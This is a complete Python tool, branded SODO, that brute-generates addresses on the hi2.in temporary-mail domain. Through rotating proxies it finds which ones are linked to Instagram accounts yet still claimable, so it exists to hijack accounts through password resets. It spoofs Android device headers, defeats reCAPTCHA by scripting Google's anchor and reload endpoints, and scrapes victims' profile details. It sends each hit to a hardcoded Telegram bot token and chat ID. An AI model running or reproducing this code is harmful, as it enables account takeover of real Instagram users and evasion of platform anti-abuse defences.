# language: Python 3, file: hi2i.py
# *proxy-aware build — per-proxy recaptcha cache, health checker, terminal menu*

import requests, time, sys, os, random, secrets, uuid, json, base64, re, string, urllib.parse
from threading import Thread, Lock
from queue import Queue, Empty
from cfonts import render

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

BLOKS_VERSION = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
_SITEKEY = "6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct"
_CO      = "aHR0cHM6Ly9oaTIuaW46NDQz"
_WEB_UA  = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

red    = "\033[1m\033[31m"; green  = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"; cyan   = "\033[1m\033[36m"
white  = "\033[1m\033[37m"; reset  = '\033[0m'

def build_session():
    s = requests.Session()
    s.mount("https://", requests.adapters.HTTPAdapter(
        pool_connections=1, pool_maxsize=1, max_retries=0
    ))
    return s

# ══════════════════════════════════════════════════════════════════════════════
#  PROXY POOL
# ══════════════════════════════════════════════════════════════════════════════

class ProxyPool:
    def __init__(self):
        self._lock  = Lock()
        self._list: list[str] = []
        self._stats: dict[str, dict] = {}
        self._idx   = 0

    def _norm(self, p: str) -> str:
        p = p.strip()
        if not p: return ""
        if not p.startswith("http"):
            p = "http://" + p
        return p

    def add_many(self, lines: list[str]):
        with self._lock:
            for line in lines:
                p = self._norm(line)
                if p and p not in self._list:
                    self._list.append(p)
                    self._stats[p] = {"ping_ms": None, "hi2_ok": None, "dead_until": 0.0}

    def load_file(self, path: str = "proxies.txt") -> int:
        try:
            with open(path) as f:
                lines = [l.strip() for l in f if l.strip()]
            self.add_many(lines)
            return len(lines)
        except FileNotFoundError:
            return 0

    def save_file(self, path: str = "proxies.txt"):
        with self._lock:
            with open(path, "w") as f:
                f.write("\n".join(self._list))

    def get(self) -> dict | None:
        with self._lock:
            if not self._list: return None
            now  = time.time()
            size = len(self._list)
            for _ in range(size):
                p = self._list[self._idx % size]
                self._idx += 1
                if self._stats[p]["dead_until"] < now:
                    return {"http": p, "https": p}
            return None

    def ban(self, proxy_dict: dict | None, duration: float = 120.0):
        if not proxy_dict: return
        p = proxy_dict.get("https") or proxy_dict.get("http")
        if p and p in self._stats:
            with self._lock:
                self._stats[p]["dead_until"] = time.time() + duration

    def report_ok(self, proxy_dict: dict | None):
        if not proxy_dict: return
        p = proxy_dict.get("https") or proxy_dict.get("http")
        if p and p in self._stats:
            with self._lock:
                self._stats[p]["dead_until"] = 0.0

    def _ping(self, proxy_str: str) -> int | None:
        try:
            start = time.time()
            r = requests.get(
                "https://hi2.in/",
                proxies={"http": proxy_str, "https": proxy_str},
                headers={"User-Agent": _WEB_UA},
                timeout=8,
            )
            if r.status_code < 500:
                return int((time.time() - start) * 1000)
        except Exception:
            pass
        return None

    def _test_hi2(self, proxy_str: str) -> bool:
        proxy_dict = {"http": proxy_str, "https": proxy_str}
        token = _get_token(proxy_dict)
        if not token: return False
        try:
            r = requests.post(
                "https://hi2.in/api/custom",
                data={
                    "domain": "hi2.in",
                    "prefix": "checktest" + secrets.token_hex(3),
                    "recaptcha": token
                },
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://hi2.in", "Referer": "https://hi2.in/",
                    "User-Agent": _WEB_UA,
                },
                proxies=proxy_dict, timeout=10,
            )
            return r.status_code in (200, 400)
        except Exception:
            return False

    def check_one(self, proxy_str: str):
        ping   = self._ping(proxy_str)
        hi2_ok = self._test_hi2(proxy_str) if ping is not None else False
        with self._lock:
            if proxy_str in self._stats:
                self._stats[proxy_str]["ping_ms"] = ping
                self._stats[proxy_str]["hi2_ok"]  = hi2_ok
                if ping is None:
                    self._stats[proxy_str]["dead_until"] = time.time() + 300

    def check_all(self, on_done=None):
        with self._lock:
            proxies = list(self._list)
        ts = [Thread(target=self.check_one, args=(p,), daemon=True) for p in proxies]
        for t in ts: t.start()
        for t in ts: t.join()
        if on_done: on_done()

    def start_bg_checker(self, interval: int = 300):
        def _loop():
            while True:
                self.check_all()
                time.sleep(interval)
        Thread(target=_loop, daemon=True).start()

    def snapshot(self) -> dict:
        now = time.time()
        with self._lock:
            total = len(self._list)
            rows  = []
            for p in self._list:
                s = self._stats[p]
                dead = s["dead_until"] > now
                rows.append({
                    "proxy": p,
                    "ping":  s["ping_ms"],
                    "hi2":   s["hi2_ok"],
                    "dead":  dead,
                })
        live  = sum(1 for r in rows if not r["dead"])
        dead  = total - live
        hi2ok = sum(1 for r in rows if r["hi2"] is True)
        return {"total": total, "live": live, "dead": dead, "hi2ok": hi2ok, "rows": rows}

    def count(self) -> int:
        with self._lock:
            return len(self._list)


pool = ProxyPool()

# ══════════════════════════════════════════════════════════════════════════════
#  RECAPTCHA — PER-PROXY TOKEN CACHE
# ══════════════════════════════════════════════════════════════════════════════

_ver_lock  = Lock()
_ver_cache = {"version": None, "ts": 0.0}
_tok_lock  = Lock()
_tok_cache: dict[str, dict] = {}

def _proxy_key(proxy: dict | None) -> str:
    if not proxy: return "__direct__"
    return proxy.get("https") or proxy.get("http") or "__direct__"

def _get_version() -> str:
    with _ver_lock:
        if _ver_cache["version"] and time.time() - _ver_cache["ts"] < 3600:
            return _ver_cache["version"]
    try:
        r = requests.get("https://www.google.com/recaptcha/api.js",
                         headers={"User-Agent": _WEB_UA}, timeout=8)
        m = re.search(r"/releases/([\w-]+)/", r.text)
        if m:
            with _ver_lock:
                _ver_cache["version"] = m.group(1)
                _ver_cache["ts"]      = time.time()
            return m.group(1)
    except Exception:
        pass
    return "rAqPVhe2JMK6mSJKi8r_vw"

def _get_token(proxy: dict | None) -> str | None:
    key = _proxy_key(proxy)
    with _tok_lock:
        c = _tok_cache.get(key)
        if c and c["token"] and time.time() - c["ts"] < 90:
            return c["token"]

    version = _get_version()
    cb   = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    sess = requests.Session()
    sess.headers.update({"User-Agent": _WEB_UA, "Accept-Language": "en-US,en;q=0.9"})
    if proxy:
        sess.proxies.update(proxy)

    anchor_url = (
        f"https://www.google.com/recaptcha/api2/anchor"
        f"?ar=1&k={_SITEKEY}&co={_CO}&hl=en&v={version}&size=invisible&cb={cb}"
    )
    try:
        r1 = sess.get(anchor_url, timeout=8)
    except Exception:
        return None

    challenge = None
    for pat in (r'"rresp","([^"]+)"', r'id="recaptcha-token" value="([^"]+)"'):
        m = re.search(pat, r1.text)
        if m: challenge = m.group(1); break
    if not challenge: return None

    payload = (
        f"v={version}&reason=q&c={urllib.parse.quote(challenge)}"
        f"&k={_SITEKEY}&co={_CO}&hl=en&size=invisible"
        f"&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!GgA4oQEAABkEBQAAAA"
    )
    try:
        r2 = sess.post(
            f"https://www.google.com/recaptcha/api2/reload?k={_SITEKEY}",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": anchor_url},
            timeout=8,
        )
    except Exception:
        return None

    for pat in (r'"rresp","([^"]+)"', r'\["rresp","([^"]+)"'):
        m = re.search(pat, r2.text)
        if m:
            tok = m.group(1)
            with _tok_lock:
                _tok_cache[key] = {"token": tok, "ts": time.time()}
            return tok
    return None

def _invalidate_token(proxy: dict | None):
    key = _proxy_key(proxy)
    with _tok_lock:
        _tok_cache[key] = {"token": None, "ts": 0.0}

# ══════════════════════════════════════════════════════════════════════════════
#  HI2 CHECK — proxy-aware
# ══════════════════════════════════════════════════════════════════════════════

def hi2_check(username: str, domain: str) -> str:
    proxy = pool.get()
    token = _get_token(proxy)
    if not token: return "error"
    try:
        r = requests.post(
            "https://hi2.in/api/custom",
            data={"domain": domain, "prefix": username, "recaptcha": token},
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://hi2.in", "Referer": "https://hi2.in/",
                "User-Agent": _WEB_UA,
            },
            proxies=proxy, timeout=10,
        )
        if r.status_code == 429:
            pool.ban(proxy, 120)
            _invalidate_token(proxy)
            return "rate_limited"
        pool.report_ok(proxy)
        if r.status_code == 200:
            email_ret = r.json().get("email", "").lower()
            return "available" if email_ret == f"{username}@{domain}".lower() else "taken"
        if r.status_code == 400:
            try:
                err = r.json().get("error", "").lower()
                if "already taken" in err: return "taken"
                if "recaptcha"     in err:
                    _invalidate_token(proxy)
                    return "error"
            except Exception:
                pass
            return "taken"
        return "error"
    except Exception:
        pool.ban(proxy, 30)
        return "error"

# ══════════════════════════════════════════════════════════════════════════════
#  INSTAGRAM FUNCTIONS
# ══════════════════════════════════════════════════════════════════════════════

def random_device():
    brand  = random.choice(["samsung","Google","Xiaomi","OnePlus","Nothing","Realme","Redmi"])
    model  = random.choice(["SM-G973F","Pixel 7","M2102J20SG","ONEPLUS A6003","A063"])
    dpi    = random.choice(["420","450","440"])
    res    = random.choice(["1080x2280","1080x2400","1440x3088"])
    av     = random.choice(["11","12","13","14"])
    iv     = random.choice([280,290,300,310,320,330,340])
    device = str(uuid.uuid4())
    family = str(uuid.uuid4())
    android= "android-" + secrets.token_hex(8)
    ua     = (f"Instagram {iv}.0.0.{random.randint(10,99)} "
              f"Android ({av}; {dpi}dpi; {res}; {brand}; {model}; en_US)")
    tz     = str(random.choice([60,330,480,570]))
    return device, family, android, ua, tz

def _check_email_fast(session, email: str) -> bool | None:
    device, _, android, ua, _ = random_device()
    try:
        r = session.post(
            "https://i.instagram.com/api/v1/users/check_email/",
            data={"email": email, "device_id": device, "guid": device},
            headers={
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "accept-language": "en-IN, en-US",
                "x-ig-app-id": "567067343352427",
                "x-ig-device-id": device,
                "x-ig-android-id": android,
                "x-ig-app-locale": "en_IN",
            },
            timeout=6,
        )
        if r.status_code == 200:
            avail = r.json().get("available")
            if avail is True:  return False
            if avail is False: return True
        return None
    except Exception:
        return None

def _bloks_search(session, email: str) -> str | None:
    device, family, android, ua, tz = random_device()
    payload = {
        'params': json.dumps({
            "client_input_params": {
                "aac": json.dumps({
                    "aac_init_timestamp": int(time.time()),
                    "aacjid": str(uuid.uuid4()),
                    "aaccs": secrets.token_urlsafe(32)
                }),
                "flash_call_permissions_status": {
                    "READ_PHONE_STATE": "PERMANENTLY_DENIED",
                    "READ_CALL_LOG": "DENIED",
                    "ANSWER_PHONE_CALLS": "DENIED"
                },
                "was_headers_prefill_available": 0, "network_bssid": None, "sfdid": "",
                "fetched_email_token_list": {}, "search_query": email,
                "auth_secure_device_id": "", "ig_oauth_token": [], "cloud_trust_token": None,
                "was_headers_prefill_used": 0, "sso_accounts_auth_data": [],
                "encrypted_msisdn": "", "device_network_info": None,
                "text_input_id": f"akyuf0:{random.randint(50,70)}",
                "zero_balance_state": None, "android_build_type": "release",
                "accounts_list": [], "is_oauth_without_permission": 0,
                "ig_android_qe_device_id": device,
                "gms_incoming_call_retriever_eligibility": "client_not_supported",
                "search_screen_type": "email_or_username", "is_whatsapp_installed": 1,
                "lois_settings": {"lois_token": ""}, "ig_vetted_device_nonce": None,
                "headers_infra_flow_id": "", "fetched_email_list": []
            },
            "server_params": {
                "event_request_id": str(uuid.uuid4()), "is_from_logged_out": 0,
                "layered_homepage_experiment_group": None, "device_id": android,
                "login_surface": "login_home", "waterfall_id": str(uuid.uuid4()),
                "INTERNAL__latency_qpl_instance_id": random.uniform(6.3e13, 6.5e13),
                "is_platform_login": 0, "context_data": "", "login_entry_point": "logged_out",
                "INTERNAL__latency_qpl_marker_id": 36707139, "family_device_id": family,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "access_flow_version": "pre_mt_behavior", "is_from_logged_in_switcher": 0,
                "qe_device_id": device
            }
        }),
        'bk_client_context': json.dumps({"bloks_version": BLOKS_VERSION, "styles_id": "instagram"}),
        'bloks_versioning_id': BLOKS_VERSION
    }
    headers = {
        'User-Agent': ua, 'accept-language': 'en-IN, en-US',
        'x-bloks-version-id': BLOKS_VERSION,
        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id': android, 'x-ig-app-id': '567067343352427',
        'x-ig-app-locale': 'en_IN', 'x-ig-device-id': device,
        'x-ig-family-device-id': family, 'x-ig-timezone-offset': tz,
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    try:
        r = session.post(
            "https://i.instagram.com/api/v1/bloks/async_action/"
            "com.bloks.www.caa.ar.search.async/",
            data=payload, headers=headers, timeout=10
        )
        return r.text
    except Exception:
        return None

def check_instagram_email(session, email: str):
    fast = _check_email_fast(session, email)
    if fast is False: return (False, None)
    if fast is True:
        text = _bloks_search(session, email)
        return (True, text)
    text = _bloks_search(session, email)
    if text and email.lower() in text.lower():
        return (True, text)
    return (False, None)

def extract_from_bloks(text):
    if not text: return None, None
    username = user_id = None
    m = re.search(r'"username"\s*:\s*"([^"]{1,40})"', text)
    if m: username = m.group(1)
    m = re.search(r'"pk"\s*:\s*"?(\d{5,20})"?', text)
    if m: user_id = m.group(1)
    return username, user_id

def fetch_profile(session, username, user_id=None):
    _, _, android, ua, _ = random_device()
    ig_headers_mobile = {
        'User-Agent': ua, 'x-ig-app-id': '567067343352427',
        'x-ig-android-id': android, 'accept-language': 'en-IN, en-US',
    }
    def _parse(u):
        return {
            'username' : u.get('username', username or 'N/A'),
            'full_name': u.get('full_name', 'N/A'),
            'bio'      : u.get('biography', 'N/A'),
            'followers': u.get('follower_count', 'N/A'),
            'following': u.get('following_count', 'N/A'),
            'private'  : u.get('is_private', False),
            'verified' : u.get('is_verified', False),
        }
    if user_id:
        try:
            r = session.get(
                f"https://i.instagram.com/api/v1/users/{user_id}/info/",
                headers=ig_headers_mobile, timeout=8)
            u = r.json().get('user', {})
            if u: return _parse(u)
        except Exception: pass
        try:
            r = session.get(
                f"https://www.instagram.com/api/v1/users/{user_id}/info/",
                headers={'User-Agent': _WEB_UA, 'x-ig-app-id': '936619743392459', 'Accept': 'application/json'},
                timeout=8)
            u = r.json().get('user', {})
            if u: return _parse(u)
        except Exception: pass
    if username:
        try:
            r = session.get(
                f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                headers={'User-Agent': _WEB_UA, 'x-ig-app-id': '936619743392459', 'Accept': 'application/json'},
                timeout=8)
            u = r.json().get('data', {}).get('user', {})
            if u:
                return {
                    'username' : u.get('username', username),
                    'full_name': u.get('full_name', 'N/A'),
                    'bio'      : u.get('biography', 'N/A'),
                    'followers': u.get('edge_followed_by', {}).get('count', 'N/A'),
                    'following': u.get('edge_follow', {}).get('count', 'N/A'),
                    'private'  : u.get('is_private', False),
                    'verified' : u.get('is_verified', False),
                }
        except Exception: pass
    return None

# ══════════════════════════════════════════════════════════════════════════════
#  GLOBALS
# ══════════════════════════════════════════════════════════════════════════════

total     = 0
ig_hit    = 0
hi2_avail = 0
hi2_taken = 0
counter_lock = Lock()
file_lock    = Lock()
tg_queue     = Queue()

logo = render('SODO', font='block', colors=['cyan', 'white'], align='left', space=True)

def header():
    print("\x1b[1;39m—" * 60)
    print(logo)
    print("\x1b[1;39m—" * 60)
    print('')

token   = "9144226847:AAGxQ1-VVIt4Y-jMJJaJ7Xib7wtkc-K31nw"
chat_id = "8609127164"

# ══════════════════════════════════════════════════════════════════════════════
#  TELEGRAM SENDER
# ══════════════════════════════════════════════════════════════════════════════

def tg_sender():
    s = build_session()
    while True:
        try:
            mail, h, prof = tg_queue.get(timeout=5)
        except Empty:
            continue
        if prof:
            priv = "🔒 Yes" if prof['private'] else "🌐 No"
            vfy  = "✅ Yes" if prof['verified'] else "No"
            msg  = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ HI2 AVAILABLE HIT — SODO\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  𝐇𝐈𝐓𝐒       : {h}\n"
                f"  𝐄𝐌𝐀𝐈𝐋     : {mail}\n"
                f"  𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄  : @{prof['username']}\n"
                f"  𝐍𝐀𝐌𝐄      : {prof['full_name']}\n"
                f"  𝐁𝐈𝐎       : {prof['bio']}\n"
                f"  𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 : {prof['followers']}\n"
                f"  𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 : {prof['following']}\n"
                f"  𝐏𝐑𝐈𝐕𝐀𝐓𝐄  : {priv}\n"
                f"  𝐕𝐄𝐑𝐈𝐅𝐈𝐄𝐃 : {vfy}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"𝐇𝐈𝐓 𝐁𝐘 : @S0DOHU\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            msg = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ HI2 AVAILABLE HIT — SODO\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  𝐇𝐈𝐓𝐒   : {h}\n"
                f"  𝐄𝐌𝐀𝐈𝐋 : {mail}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"𝐇𝐈𝐓 𝐁𝐘 : @S0DOHU\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
        try:
            s.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'},
                timeout=10
            )
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════════════════
#  STATUS LOOP — checker stats + proxy dashboard
# ══════════════════════════════════════════════════════════════════════════════

def status_loop():
    while True:
        time.sleep(1)
        clear()
        snap = pool.snapshot()

        print(f"\x1b[1;36m{'▰▱' * 10}{reset}")
        print(f"{white}𝐂𝐇𝐄𝐂𝐊𝐄𝐃         ➜ {yellow}{total}{reset}")
        print(f"{white}𝐈𝐆 𝐇𝐈𝐓          ➜ {cyan}{ig_hit}{reset}")
        print(f"{white}𝐇𝐈2 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 ➜ {green}{hi2_avail}{reset}")
        print(f"{white}𝐇𝐈2 𝐓𝐀𝐊𝐄𝐍      ➜ {red}{hi2_taken}{reset}")
        print(f"\x1b[1;36m{'▱▰' * 10}{reset}\n")

        print(f"\x1b[1;35m{'═' * 62}{reset}")
        print(f"  PROXY DASHBOARD")
        print(f"\x1b[1;35m{'═' * 62}{reset}")
        print(
            f"  {white}TOTAL{reset} {snap['total']}   "
            f"{green}LIVE {snap['live']}{reset}   "
            f"{red}DEAD {snap['dead']}{reset}   "
            f"{cyan}HI2 OK {snap['hi2ok']}{reset}"
        )
        print(f"\x1b[1;35m{'─' * 62}{reset}")
        print(f"  {'PROXY':<36} {'PING':>7}  {'HI2':>4}  STATUS")
        print(f"\x1b[1;35m{'─' * 62}{reset}")

        for row in snap['rows'][:18]:
            proxy_short = row['proxy'].replace("http://", "").replace("https://", "")[:35]
            ping_str    = f"{row['ping']}ms" if row['ping'] is not None else "---"
            if row['hi2'] is True:
                hi2_str = f"{green}✓{reset}"
            elif row['hi2'] is False:
                hi2_str = f"{red}✗{reset}"
            else:
                hi2_str = f"{yellow}?{reset}"
            status_str = f"{red}DEAD{reset}" if row['dead'] else f"{green}LIVE{reset}"
            print(f"  {proxy_short:<36} {ping_str:>7}  {hi2_str:>4}  {status_str}")

        if snap['total'] > 18:
            print(f"  {yellow}... +{snap['total'] - 18} more{reset}")

        print(f"\x1b[1;35m{'═' * 62}{reset}")
        print(f"  {white}DEV — @S0DOHU{reset}")
        print(f"\x1b[1;35m{'═' * 62}{reset}")

# ══════════════════════════════════════════════════════════════════════════════
#  WORKER
# ══════════════════════════════════════════════════════════════════════════════

def genprefix():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 7)))

def worker(domain):
    global total, ig_hit, hi2_avail, hi2_taken
    session = build_session()

    while True:
        prefix = genprefix()
        email  = f'{prefix}@{domain}'

        is_on_ig, rtext = check_instagram_email(session, email)

        with counter_lock:
            total += 1
            if is_on_ig: ig_hit += 1

        if not is_on_ig:
            continue

        hi2_status = hi2_check(prefix, domain)

        if hi2_status != "available":
            with counter_lock:
                hi2_taken += 1
            continue

        with counter_lock:
            hi2_avail += 1
            h = hi2_avail

        ig_username, user_id = extract_from_bloks(rtext)
        prof                 = fetch_profile(session, ig_username, user_id)

        with file_lock:
            with open('Available_Hits.txt', 'a', encoding='utf-8') as f:
                f.write(f"Email     : {email}\n")
                if prof:
                    f.write(f"Username  : @{prof['username']}\n")
                    f.write(f"Name      : {prof['full_name']}\n")
                    f.write(f"Bio       : {prof['bio']}\n")
                    f.write(f"Followers : {prof['followers']}\n")
                    f.write(f"Following : {prof['following']}\n")
                    f.write(f"Private   : {prof['private']}\n")
                    f.write(f"Verified  : {prof['verified']}\n")
                f.write("—" * 40 + "\n")

        tg_queue.put((email, h, prof))

# ══════════════════════════════════════════════════════════════════════════════
#  STARTUP MENU
# ══════════════════════════════════════════════════════════════════════════════

def menu_add_proxies():
    clear(); header()
    print(f"{cyan}Proxies paste karo (ek line pe ek, blank line pe done):{reset}\n")
    lines = []
    while True:
        try:
            line = input().strip()
        except EOFError:
            break
        if not line: break
        lines.append(line)
    if lines:
        pool.add_many(lines)
        pool.save_file()
        print(f"\n{green}✓ {len(lines)} proxies add ho gaye.{reset}")
    time.sleep(1.2)

def menu_check_health():
    clear(); header()
    n = pool.count()
    if n == 0:
        print(f"{red}Koi proxy nahi hai. Pehle add karo.{reset}")
        time.sleep(2)
        return
    print(f"{cyan}Checking {n} proxies...{reset}\n")
    done = [False]
    def _done(): done[0] = True
    Thread(target=pool.check_all, args=(_done,), daemon=True).start()
    while not done[0]:
        snap = pool.snapshot()
        sys.stdout.write(
            f"\r  Live: {green}{snap['live']}{reset}  "
            f"Dead: {red}{snap['dead']}{reset}  "
            f"HI2 OK: {cyan}{snap['hi2ok']}{reset}    "
        )
        sys.stdout.flush()
        time.sleep(0.5)
    print(f"\n\n{green}✓ Health check complete.{reset}")
    time.sleep(2)

def startup_menu(threads: int):
    while True:
        clear(); header()
        snap = pool.snapshot()
        print(
            f"{cyan}  Proxies: {snap['total']}  "
            f"Live: {green}{snap['live']}{reset}{cyan}  "
            f"Dead: {red}{snap['dead']}{reset}{cyan}  "
            f"HI2 OK: {snap['hi2ok']}{reset}\n"
        )
        print(f"{white}  [1] Proxies add karo (paste){reset}")
        print(f"{white}  [2] proxies.txt se load karo{reset}")
        print(f"{white}  [3] Proxy health check karo{reset}")
        print(f"{white}  [4] Run karo  ({threads} threads · domain: hi2.in){reset}")
        print(f"{white}  [5] Exit{reset}\n")

        choice = input(f"{cyan}  Choice ➜ {reset}").strip()

        if choice == "1":
            menu_add_proxies()
        elif choice == "2":
            n = pool.load_file()
            clear(); header()
            if n:
                print(f"{green}✓ {n} proxies load ho gaye proxies.txt se.{reset}")
            else:
                print(f"{red}proxies.txt nahi mila ya empty hai.{reset}")
            time.sleep(1.5)
        elif choice == "3":
            menu_check_health()
        elif choice == "4":
            break
        elif choice == "5":
            sys.exit(0)

# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    domain  = 'hi2.in'
    threads = int(sys.argv[1]) if len(sys.argv) > 1 else 100

    print("\033[1;94m--- SODO Starting... ---\033[0m\n")
    time.sleep(1)

    loaded = pool.load_file()
    if loaded:
        print(f"{green}✓ {loaded} proxies auto-loaded from proxies.txt{reset}")
        time.sleep(0.8)

    startup_menu(threads)

    clear(); header()
    print(f"{cyan}Starting {threads} threads...{reset}\n")
    time.sleep(1)

    Thread(target=tg_sender,   daemon=True).start()
    Thread(target=status_loop, daemon=True).start()
    pool.start_bg_checker(interval=300)

    for _ in range(threads):
        Thread(target=worker, args=(domain,), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{red}stopped. hits → Available_Hits.txt{reset}")
